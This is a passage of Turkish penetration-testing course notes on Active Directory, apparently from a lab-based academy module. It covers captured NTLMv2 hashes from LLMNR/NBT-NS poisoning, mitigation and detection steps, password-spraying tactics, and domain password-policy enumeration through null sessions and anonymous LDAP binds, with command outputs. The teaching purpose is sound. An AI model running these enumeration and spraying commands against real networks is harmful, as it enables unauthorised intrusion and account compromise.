backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:01010000000000001DBF1816222DD801DF80FE7D54E898EF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001DBF1816222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000016010623222DD801B9083B0DCEE1D9520000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080016010623222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000

<SNIP>
```

`GET NTLMV2USERNAMES` yazabilir ve hangi kullanıcı adlarını topladığımızı görebiliriz. Bu, ek numaralandırma yapmak ve hangilerinin Hashcat kullanarak çevrimdışı kırmaya değer olduğunu görmek için bir kullanıcı listesi istiyorsak yararlıdır.

```powershell-session
=================================================== NTLMv2 Usernames ===================================================

IP Address                        Host                              Username                          Challenge
========================================================================================================================
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\backupagent       | B5013246091943D7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\forend            | 32FD89BD78804B04
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\clusteragent      | 28BF08D82FA998E4
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\wley              | 277AC2ED022DB4F7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\svc_qualys        | 5F9BB670D23F23ED
```

Inveigh'i başlatalım ve ardından her şeyi bir araya getirmek için çıktı ile biraz etkileşime girelim.
![Pasted image 20241018132103.png](/img/user/resimler/Pasted%20image%2020241018132103.png)


## **İyileştirme**
Mitre ATT&CK bu tekniği [ID](https://attack.mitre.org/techniques/T1557/001) olarak listeler [:](https://attack.mitre.org/techniques/T1557/001) [T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle olarak` listeler `:` `LLMNR/NBT-NS Poisoning ve SMB Relay`.

Bu saldırıyı hafifletmenin birkaç yolu vardır. Bu spoofing saldırılarının mümkün olmadığından emin olmak için LLMNR ve NBT-NS'yi devre dışı bırakabiliriz. Bir uyarı olarak, ortamınızda bunun gibi önemli bir değişikliği tamamen yaymadan önce dikkatlice yavaşça test etmek her zaman faydalı olacaktır. Sızma testi uzmanları olarak bu düzeltme adımlarını önerebiliriz, ancak müşterilerimize her iki protokolün devre dışı bırakılmasının ağdaki herhangi bir şeyi bozmadığından emin olmak için bu değişiklikleri yoğun bir şekilde test etmeleri gerektiğini açıkça belirtmeliyiz.

Computer Configuration --> Administrative Templates --> Network --> DNS Client'a gidip "Turn OFF Multicast Name Resolution" seçeneğini etkinleştirerek Group Policy'de LLMNR'yi devre dışı bırakabiliriz.

![Pasted image 20241018132549.png](/img/user/resimler/Pasted%20image%2020241018132549.png)

NBT-NS Group Policy aracılığıyla devre dışı bırakılamaz, ancak her hostta lokal olarak devre dışı bırakılmalıdır. Bunu `Control Panel` altında `Network and Sharing Center'` ı açarak, `Change adapter settings`'e tıklayarak, özelliklerini görüntülemek için adaptöre sağ tıklayarak, `Internet Protocol Version 4'ü (TCP/IPv4)` seçerek ve `Properties` düğmesine tıklayarak, ardından `Advanced` 'e tıklayarak ve `WINS` sekmesini seçerek ve son olarak `Disable NetBIOS over TC` `P/IP`'yi seçerek yapabiliriz.

![Pasted image 20241018132727.png](/img/user/resimler/Pasted%20image%2020241018132727.png)

NBT-NS'yi doğrudan GPO aracılığıyla devre dışı bırakmak mümkün olmasa da, Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup altında aşağıdaki gibi bir PowerShell script'i oluşturabiliriz:

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

Local Group Policy Editor'de `Startup`'a çift tıklamamız, `PowerShell Scripts` sekmesini seçmemiz ve `önce Windows PowerShell` scriptlerini `çalıştırmak` için "For this GPO, run scripts in the following order" seçeneğini seçmemiz ve ardından `Add'` e tıklayıp scripti seçmemiz gerekecektir. Bu değişikliklerin gerçekleşmesi için ya hedef sistemi yeniden başlatmamız ya da ağ adaptörünü yeniden başlatmamız gerekir.

![Pasted image 20241018132903.png](/img/user/resimler/Pasted%20image%2020241018132903.png)

Bunu bir domain'deki tüm host'lara göndermek için Domain Controller'da `Group Policy Management` kullanarak bir GPO oluşturabilir ve scripts klasöründeki SYSVOL paylaşımında scripti barındırabilir ve ardından UNC yolu üzerinden çağırabiliriz:

\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts

GPO belirli OU'lara uygulandıktan ve bu hostlar yeniden başlatıldıktan sonra, script SYSVOL paylaşımında hala mevcutsa ve host tarafından ağ üzerinden erişilebilirse, script bir sonraki yeniden başlatmada çalışacak ve NBT-NS'yi devre dışı bırakacaktır.

![Pasted image 20241018132952.png](/img/user/resimler/Pasted%20image%2020241018132952.png)


## **Algılama**
LLMNR ve NetBIOS'u devre dışı bırakmak her zaman mümkün değildir ve bu nedenle bu tür saldırı davranışlarını tespit etmek için yollara ihtiyacımız vardır. Bunun bir yolu, farklı subnet'lerde var olmayan hosts için LLMNR ve NBT-NS istekleri enjekte ederek ve yanıtlardan herhangi biri saldırganın ad çözümleme yanıtlarını taklit ettiğinin göstergesi olabilecek yanıtlar alırsa uyarı vererek saldırıyı saldırganlara karşı kullanmaktır. Bu [blog yazısı](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) bu yöntemi daha derinlemesine açıklamaktadır.

Ayrıca, hostlar UDP 5355 ve 137 portlarındaki trafik için izlenebilir ve olay ID'leri [4697](“https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697”) ve [7045](“https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html”) için izlenebilir. Son olarak, `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` registry anahtarını `EnableMulticast` DWORD değerindeki değişiklikler için izleyebiliriz. Değerin `0` olması LLMNR'nin devre dışı bırakıldığı anlamına gelir.


## **Devam Ediyoruz**
Şimdi birkaç hesap için hash yakaladık. Değerlendirmemizin bu noktasında, BloodHound gibi bir araç kullanarak bu hash'lerden herhangi birinin veya tamamının kırılmaya değer olup olmadığını belirlemek için numaralandırma yapmak isteyebiliriz. Şansımız yaver gider ve bazı ayrıcalıklı erişim veya haklara sahip bir kullanıcı hesabının hash'ini kırarsak, domain'e erişimimizi genişletmeye başlayabiliriz. Hatta çok şanslı olabilir ve bir Domain Admin kullanıcısının hash'ini kırabiliriz! Eğer hash kırma konusunda şansımız yaver gitmediyse ya da bazı hash'leri kırdıysak ama sonuç alamadıysak, o zaman belki de parola püskürtme (ilerleyen birkaç bölümde derinlemesine ele alacağız) daha başarılı olacaktır.


# **Password Spraying**
Password spraying, sistemlere erişim elde edilmesine ve potansiyel olarak hedef ağda bir yer edinilmesine neden olabilir. Saldırı, ortak bir parola ve daha uzun bir kullanıcı adı veya e-posta adresi listesi kullanarak açık bir hizmette oturum açmaya çalışmayı içerir. Kullanıcı adları ve e-postalar, sızma testinin OSINT aşamasında veya ilk numaralandırma girişimlerimiz sırasında toplanmış olabilir. Bir sızma testinin statik olmadığını, yeni veriler ortaya çıkardıkça sürekli olarak çeşitli teknikler ve tekrar eden süreçler aracılığıyla yinelediğimizi unutmayın. Zamanımızı etkili bir şekilde kullanmak için genellikle bir ekip halinde çalışacağız veya aynı anda birden fazla TTP uygulayacağız. Kariyerimizde ilerledikçe, tarama, hash kırma girişimi ve diğerleri gibi birçok görevimizin oldukça zaman aldığını göreceğiz. Zamanımızı etkin ve yaratıcı bir şekilde kullandığımızdan emin olmamız gerekir çünkü çoğu değerlendirme zaman kısıtlıdır. Dolayısıyla, zehirleme girişimlerimiz devam ederken, Password Spraying yoluyla erişim sağlamaya çalışmak için elimizdeki bilgileri de kullanabiliriz. Şimdi Parola spreyleme için bazı hususları ve elimizdeki bilgilerden hedef listemizi nasıl oluşturacağımızı ele alalım.



## Story Time
Password spraying, içeride bir yer edinmek için çok etkili bir yol olabilir. Bu tekniğin değerlendirmelerim sırasında bir dayanak noktası bulmama yardımcı olduğu birçok kez olmuştur. Bu örneklerin, bir Linux Virtual VM ve kapsam dahilindeki IP aralıklarının bir listesi ile iç ağ erişimine sahip olduğum ve başka hiçbir şeye sahip olmadığım, saldırgan olmayan "gri kutu" değerlendirmelerinden geldiğini unutmayın.

### Senaryo 1  

Bu ilk örnekte, tüm standart kontrollerimi yaptım ve geçerli kullanıcıların bir listesini almamı sağlayabilecek SMB NULL oturumu veya LDAP anonim bağlama gibi yararlı bir şey bulamadım. Bu nedenle, geçerli domain kullanıcılarını numaralandırarak bir hedef kullanıcı adı listesi oluşturmak için `Kerbrute` aracını kullanmaya karar verdim (bu bölümde daha sonra ele alacağımız bir teknik). Bu listeyi oluşturmak için [istatistiksel olarak olası kullanıcı](https://github.com/insidetrust/statistically-likely-usernames) adları GitHub deposundan `jsmith.txt` kullanıcı adı listesini aldım ve bunu LinkedIn'i kazıyarak elde ettiğim sonuçlarla birleştirdim. Bu birleştirilmiş liste elimdeyken, `Kerbrute` ile geçerli kullanıcıları numaralandırdım ve ardından aynı aracı kullanarak `Welcome1` ortak parolasıyla parola spreyi uyguladım. Çok düşük ayrıcalıklı kullanıcılar için bu parolayla iki sonuç elde ettim, ancak bu bana BloodHound'u çalıştırmak ve sonunda domainin ele geçirilmesine yol açan saldırı yollarını belirlemek için domain içinde yeterli erişim sağladı.

### Senaryo 2  

İkinci değerlendirmede, benzer bir kurulumla karşı karşıya kaldım, ancak geçerli domain kullanıcılarını ortak kullanıcı adı listeleriyle numaralandırmak ve LinkedIn'den gelen sonuçlar herhangi bir sonuç vermedi. Google'a döndüm ve kuruluş tarafından yayınlanan PDF'leri aradım. Aramam birçok sonuç verdi ve bunlardan 4 tanesinin belge özelliklerinde dahili kullanıcı adı yapısının `F9L8` biçiminde olduğunu, yalnızca büyük harfler ve rakamlar (`A-Z ve 0-9`) kullanılarak rastgele oluşturulmuş GUID'ler olduğunu doğruladım. Bu bilgi belgeyle birlikte `Yazar` alanında yayınlanmıştır ve herhangi bir şeyi çevrimiçi yayınlamadan önce belge meta verilerini temizlemenin önemini göstermektedir. Buradan, 16.679.616 olası kullanıcı adı kombinasyonu oluşturmak için kısa bir Bash betiği kullanılabilir.

```bash
#!/bin/bash

for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
    do echo $x;
done
```

Daha sonra `Kerbrute` ile oluşturulan kullanıcı adı listesini domain'deki her bir kullanıcı hesabını numaralandırmak için kullandım. Kullanıcı adlarını listelemeyi zorlaştırmak için yaptığım bu girişim, tahmin edilebilir GUID kullanımı ve bulabildiğim PDF meta verileri sayesinde domaindeki her bir hesabı listeleyebilmemle sonuçlandı ve saldırıyı büyük ölçüde kolaylaştırdı. Tipik olarak, `jsmith.txt` gibi bir liste kullanarak geçerli hesapların yalnızca %40-60'ını belirleyebiliyorum. Bu örnekte, saldırıyı hedef listemdeki TÜM domain hesaplarıyla başlatarak başarılı bir parola püskürtme saldırısı yapma şansımı önemli ölçüde artırdım. Buradan, birkaç hesap için geçerli parolalar elde ettim. Sonunda, domain üzerinde kontrolü ele geçirmek için [Kaynak Tabanlı Kısıtlı Delegasyon (RBCD)](“https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a”) ve [Gölge Kimlik Bilgileri](“https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition”) saldırısını içeren karmaşık bir saldırı zincirini takip edebildim.



## **Password Spraying Dikkat Edilmesi Gerekenler**
Password spraying bir sızma testçisi ya da kırmızı ekip için faydalı olsa da, dikkatsiz kullanım yüzlerce üretim hesabının kilitlenmesi gibi önemli zararlara neden olabilir. Buna bir örnek, uzun bir parola listesi kullanarak bir hesabın parolasını belirlemeye yönelik brute-forcing girişimleridir. Buna karşılık, parola püskürtme, birden fazla sektörde çok yaygın parolaları kullanan daha ölçülü bir saldırıdır. Aşağıdaki tabloda bir parola spreyi görselleştirilmiştir.


#### **Password Spray Görselleştirme**
![Pasted image 20241018193038.png](/img/user/resimler/Pasted%20image%2020241018193038.png)

Kullanıcı adı başına daha az oturum açma isteği göndermeyi içerir ve brute force saldırısına göre hesapları kilitleme olasılığı daha düşüktür. Bununla birlikte, password spraying hala kilitlenme riski taşır, bu nedenle oturum açma girişimleri arasında bir gecikme olması önemlidir. İç password spreyleme bir ağ içinde yanal olarak hareket etmek için kullanılabilir ve hesap kilitlemeleriyle ilgili aynı hususlar geçerlidir. Ancak, dahili erişimle domain parola politikasını elde etmek mümkün olabilir ve bu riski önemli ölçüde azaltır.

Hesabı kilitlemeden önce beş hatalı denemeye izin veren ve 30 dakikalık otomatik kilit açma eşiğine sahip bir parola ilkesi bulmak yaygındır. Bazı kuruluşlar daha uzun hesap kilitleme eşikleri yapılandırır, hatta bir yöneticinin hesapların kilidini manuel olarak açmasını gerektirir. Parola ilkesini bilmiyorsanız, iyi bir kural olarak denemeler arasında birkaç saat beklemeniz gerekir; bu süre hesap kilitleme eşiğinin sıfırlanması için yeterli olacaktır. En iyisi, dahili bir değerlendirme sırasında saldırı girişiminde bulunmadan önce parola politikasını edinmektir, ancak bu her zaman mümkün değildir. İhtiyatlı davranabilir ve bir dayanak noktası bulmak ya da erişimi ilerletmek için diğer tüm seçenekler tükenmişse “hail mary” olarak zayıf/ortak bir parola kullanarak tek bir hedefli parola püskürtme denemesi yapmayı seçebiliriz. Değerlendirmenin türüne bağlı olarak, müşteriden her zaman parola politikasını netleştirmesini isteyebiliriz. Zaten bir dayanağımız varsa veya testin bir parçası olarak bir kullanıcı hesabı sağlanmışsa, parola politikasını çeşitli şekillerde sıralayabiliriz. Bunu bir sonraki bölümde uygulayalım.


# **Password Policy'lerin Numaralandırılması ve Getirilmesi**

## **Password Policy Numaralandırılması - Linux'tan - Credentialed**

Önceki bölümde belirtildiği gibi, domain password policy'yi domain'in nasıl yapılandırıldığına ve geçerli domain kimlik bilgilerine sahip olup olmadığımıza bağlı olarak çeşitli şekillerde alabiliriz. Geçerli domain kimlik bilgileriyle, parola ilkesi [CrackMapExec](“https://github.com/byt3bl33d3r/CrackMapExec”) veya `rpcclient` gibi araçlar kullanılarak uzaktan da elde edilebilir.

![Pasted image 20241018200127.png](/img/user/resimler/Pasted%20image%2020241018200127.png)


## Enumerating the Password Policy - from Linux - SMB NULL Sessions
Kimlik bilgileri olmadan, password policy'yi bir SMB NULL oturumu veya LDAP anonim bağlama yoluyla elde edebiliriz. Birincisi SMB NULL oturumu aracılığıyla olur. SMB NULL oturumları, kimliği doğrulanmamış bir saldırganın domain'den kullanıcıların, grupların, bilgisayarların, kullanıcı hesabı özniteliklerinin ve domain parola ilkesinin tam listesi gibi bilgileri almasına olanak tanır. SMB NULL oturumu yanlış yapılandırmaları genellikle eski Domain Controller'ların yerinde yükseltilmesinin sonucudur ve sonuçta Windows Server'ın eski sürümlerinde varsayılan olarak var olan güvensiz yapılandırmaları da beraberinde getirir.

Windows Server'ın önceki sürümlerinde bir domain oluşturulurken, domain numaralandırmasına izin veren belirli paylaşımlara anonim erişim verilirdi. Bir SMB NULL oturumu kolayca numaralandırılabilir. Numaralandırma için `enum4linux`, `CrackMapExec`, `rpcclient` gibi araçları kullanabiliriz.

Bir Domain Controller'da SMB NULL oturum erişimi olup olmadığını kontrol etmek için [rpcclient](“https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html”) kullanabiliriz.  

Bağlandıktan sonra, domain hakkında bilgi almak ve NULL oturum erişimini onaylamak için `querydominfo` gibi bir RPC komutu verebiliriz.


#### Using rpcclient
```shell-session
M1R4CKCK@htb[/htb]$ rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
Total Groups:	0
Total Aliases:	37
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1
```
Parola politikasını da elde edebiliriz. Parola politikasının nispeten zayıf olduğunu ve en az 8 karakterlik bir parolaya izin verdiğini görebiliriz.


#### **rpcclient Kullanarak Password Policy'nin Elde Edilmesi**
```shell-session
rpcclient $> querydominfo

Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
Total Groups:	0
Total Aliases:	37
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1
rpcclient $> getdompwinfo
min_password_length: 8
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX
```

Bunu [enum4linux](“https://labs.portcullis.co.uk/tools/enum4linux”) kullanarak deneyelim. `enum4linux`, Windows hostlarının ve domainlerinin numaralandırılması için kullanılmak üzere `nmblookup`, `net`, `rpcclient` ve `smbclient` [araçlarının Samba paketi](“https://www.samba.org/samba/docs/current/man-html/samba.7.html”) etrafında oluşturulmuş bir araçtır. Parrot Security Linux da dahil olmak üzere birçok farklı sızma testi dağıtımında önceden yüklenmiş olarak bulunabilir. Aşağıda `enum4linux` tarafından sağlanabilecek bilgileri gösteren örnek bir çıktı var. İşte bazı yaygın numaralandırma araçları ve kullandıkları portlar:

![Pasted image 20241018225306.png](/img/user/resimler/Pasted%20image%2020241018225306.png)

#### Using enum4linux

```shell-session
[!bash!]$ enum4linux -P 172.16.5.5

<SNIP>

 ================================================== 
|    Password Policy Information for 172.16.5.5    |
 ================================================== 

[+] Attaching to 172.16.5.5 using a NULL share
[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:172.16.5.5)

[+] Trying protocol 445/SMB...
[+] Found domain(s):

	[+] INLANEFREIGHT
	[+] Builtin

[+] Password Info for Domain: INLANEFREIGHT

	[+] Minimum password length: 8
	[+] Password history length: 24
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000001

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 1

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: 5
	[+] Forced Log off Time: Not Set

[+] Retieved partial password policy with rpcclient:

Password Complexity: Enabled
Minimum Password Length: 8

enum4linux complete on Tue Feb 22 17:39:29 2022
```

[enum4linux-ng](“https://github.com/cddmp/enum4linux-ng”) aracı Python'da `enum4linux` 'un yeniden yazımıdır, ancak verileri daha sonra verileri daha fazla işlemek veya diğer araçlara beslemek için kullanılabilecek YAML veya JSON dosyaları olarak dışa aktarma yeteneği gibi ek özelliklere sahiptir. Diğer özelliklerin yanı sıra renkli çıktıyı da destekler


#### Using enum4linux-ng
```shell-session
[!bash!]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight

ENUM4LINUX - next generation

<SNIP>

 =======================================
|    RPC Session Check on 172.16.5.5    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 =================================================
|    Domain Information via RPC for 172.16.5.5    |
 =================================================
[+] Domain: INLANEFREIGHT
[+] SID: S-1-5-21-3842939050-3880317879-2865463114
[+] Host is part of a domain (not a workgroup)
 =========================================================
|    Domain Information via SMB session for 172.16.5.5    |
========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: ACADEMY-EA-DC01
NetBIOS domain name: INLANEFREIGHT
DNS domain: INLANEFREIGHT.LOCAL
FQDN: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

 =======================================
|    Policies via RPC for 172.16.5.5    |
 =======================================
[*] Trying port 445/tcp
[+] Found policy:
domain_password_information:
  pw_history_length: 24
  min_pw_length: 8
  min_pw_age: 1 day 4 minutes
  max_pw_age: not set
  pw_properties:
  - DOMAIN_PASSWORD_COMPLEX: true
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
domain_lockout_information:
  lockout_observation_window: 30 minutes
  lockout_duration: 30 minutes
  lockout_threshold: 5
domain_logoff_information:
  force_logoff_time: not set

Completed after 5.41 seconds
```

Enum4linux-ng bize biraz daha net bir çıktı ve `-oA` bayrağını kullanarak kullanışlı JSON ve YAML çıktısı sağladı.


#### **ilfreight.json içeriğini görüntüleme**

```shell-session
[!bash!]$ cat ilfreight.json 

{
    "target": {
        "host": "172.16.5.5",
        "workgroup": ""
    },
    "credentials": {
        "user": "",
        "password": "",
        "random_user": "yxditqpc"
    },
    "services": {
        "SMB": {
            "port": 445,
            "accessible": true
        },
        "SMB over NetBIOS": {
            "port": 139,
            "accessible": true
        }
    },
    "smb_dialects": {
        "SMB 1.0": false,
        "SMB 2.02": true,
        "SMB 2.1": true,
        "SMB 3.0": true,
        "SMB1 only": false,
        "Preferred dialect": "SMB 3.0",
        "SMB signing required": true
    },
    "sessions_possible": true,
    "null_session_possible": true,

<SNIP>
```


## **Null Oturumu Numaralandırma - Windows'tan**
Windows'tan bu tür bir null session saldırısı yapmak daha az yaygındır, ancak bir windows makinesinden null session oluşturmak için `net use \\host\ipc$ “” /u:` “” komutunu kullanabilir ve bu tür bir saldırıyı daha fazla `gerçekleştirip` gerçekleştiremeyeceğimizi doğrulayabiliriz.

#### **Windows'tan null oturumu oluşturma**
```cmd-session
C:\htb> net use \\DC01\ipc$ "" /u:""
The command completed successfully.
```

Bağlanmayı denemek için bir kullanıcı adı/şifre kombinasyonu da kullanabiliriz. Kimlik doğrulamaya çalışırken bazı yaygın hataları görelim:


#### Error: Account is Disabled
```cmd-session
C:\htb> net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.

This user can't sign in because this account is currently disabled.
```


#### **Hata:** **Şifre Yanlış**
```cmd-session
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1326 has occurred.

The user name or password is incorrect.
```


#### **Hata oluştu:** **Hesap kilitlendi (Şifre Politikası)**
```cmd-session
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1909 has occurred.

The referenced account is currently locked out and may not be logged on to.
```


## **Password Policy'nin Numaralandırılması - Linux'tan - LDAP Anonim Bağlama**
[LDAP anonim bağlamaları](“https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled”), kimliği doğrulanmamış saldırganların domain'den kullanıcıların, grupların, bilgisayarların, kullanıcı hesabı özniteliklerinin ve domain parola ilkesinin tam listesi gibi bilgileri almasına olanak tanır. Bu eski bir yapılandırmadır ve Windows Server 2003'ten itibaren yalnızca kimliği doğrulanmış kullanıcıların LDAP istekleri başlatmasına izin verilmektedir. Bir yöneticinin anonim bağlamalara izin vermek için belirli bir uygulamayı ayarlaması ve amaçlanan erişim miktarından daha fazlasını vermesi ve böylece kimliği doğrulanmamış kullanıcıların AD'deki tüm nesnelere erişmesine izin vermesi gerekebileceğinden, bu yapılandırmayı hala zaman zaman görüyoruz.

Bir LDAP anonim bağlama ile, şifre politikasını çekmek için `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`, vb. gibi LDAP'a özgü numaralandırma araçlarını kullanabiliriz. [ldapsearch](“https://linux.die.net/man/1/ldapsearch”) ile biraz zahmetli olabilir ama yapılabilir. Parola ilkesini almak için örnek bir komut aşağıdaki gibidir:

#### **ldapsearch'ü kullanma**
```shell-session
[!bash!]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
modifiedCountAtLastProm: 0
nextRid: 1002
pwdProperties: 1
pwdHistoryLength: 24
```
Burada minimum parola uzunluğunun 8, kilitleme eşiğinin 5 ve parola karmaşıklığının ayarlandığını görebiliriz (`pwdProperties` `1` olarak ayarlanmıştır).



## **Password Policy'nin Numaralandırılması - Windows'tan**
Bir Windows hostundan domain'e kimlik doğrulaması yapabiliyorsak, parola ilkesini almak için `net.exe` gibi yerleşik Windows ikililerini kullanabiliriz. Ayrıca PowerView, Windows'a taşınmış CrackMapExec, SharpMapExec, SharpView gibi çeşitli araçları da kullanabiliriz.  

Built-in komutları kullanmak, bir Windows sistemine indiğimizde ve araçları ona aktaramadığımızda veya client tarafından bir Windows sistemine yerleştirildiğimizde, ancak araçları ona aktarmanın bir yolu olmadığında yararlıdır. Yerleşik net.exe ikilisini kullanan bir örnek:


#### Using net.exe
```cmd-session
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

Burada aşağıdaki bilgileri toplayabiliriz:  

- Parolaların süresi asla dolmaz (Maksimum parola yaşı Sınırsız olarak ayarlanmıştır)  
- Minimum parola uzunluğu 8'dir, bu nedenle zayıf parolaların kullanılıyor olması muhtemeldir  
- Kilitleme eşiği 5 yanlış paroladır .
- Hesaplar 30 dakika boyunca kilitli kaldı

Bu parola politikası, parola püskürtme için mükemmeldir. Sekiz karakterlik minimum değer, `Welcome1` gibi yaygın zayıf parolaları deneyebileceğimiz anlamına gelir. 5'lik kilitleme eşiği, herhangi bir hesabı kilitleme riski olmadan her 31 dakikada 2-3 (güvenli olması için) püskürtme deneyebileceğimiz anlamına gelir. Bir hesap kilitlenmişse, 30 dakika sonra otomatik olarak (bir yöneticinin manuel müdahalesi olmadan) açılacaktır, ancak ne pahasına olursa olsun `HERHANGİ` bir hesabı kilitlemekten kaçınmalıyız.

PowerView da bunun için oldukça kullanışlıdır:


#### Using PowerView
```powershell-session
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```
PowerView bize `net accounts` komutumuzla aynı çıktıyı verdi, sadece farklı bir formatta ama aynı zamanda parola karmaşıklığının etkin olduğunu gösterdi (`PasswordComplexity=1`).  

Linux'ta olduğu gibi, ister saldırı sistemimiz ister müşteri tarafından sağlanan bir sistem olsun, bir Windows sistemindeyken parola ilkesini almak için elimizde birçok araç vardır. PowerView/SharpView, CrackMapExec, SharpMapExec ve diğerleri gibi her zaman iyi bahislerdir. Araçların seçimi, değerlendirmenin amacına, gizlilik hususlarına, yürürlükteki herhangi bir anti-virüs veya EDR'ye ve hedef host üzerindeki diğer potansiyel kısıtlamalara bağlıdır. Birkaç örneği ele alalım.


## Analyzing the Password Policy

Şimdi parola ilkesini çeşitli şekillerde çektik. INLANEFREIGHT.LOCAL domain için politikayı parça parça inceleyelim.

- Minimum parola uzunluğu 8'dir (8 çok yaygındır, ancak günümüzde giderek daha fazla kuruluşun 10-14 karakterli bir parola uyguladığını görüyoruz, bu da bizim için bazı parola seçeneklerini ortadan kaldırabilir, ancak parola püskürtme vektörünü tamamen azaltmaz)  
    
- Hesap kilitleme eşiği 5'tir (3 gibi daha düşük bir eşik veya hatta hiç kilitleme eşiği belirlenmediğini görmek nadir değildir)  
    
